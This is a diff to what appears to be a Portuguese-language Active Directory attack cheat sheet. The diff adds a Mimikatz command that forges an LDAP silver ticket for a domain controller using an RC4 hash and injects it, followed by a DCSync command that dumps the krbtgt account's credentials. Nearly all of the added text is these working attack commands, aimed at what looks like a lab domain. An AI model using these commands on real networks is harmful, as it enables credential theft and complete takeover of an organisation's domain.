@@ -1419,7 +1419,11 @@ enter-pssession -computername tech-dc01.tech.local
 ```
 ##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): LDAP DCSYNC
 ```
-aaa
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:ldap /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
+```
+RODAR O ATAQUE DCSYNC:
+```
+lsadump::dcsync /user:tech\krbtgt
 ```
 ##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): WMI COMMAND
 ```
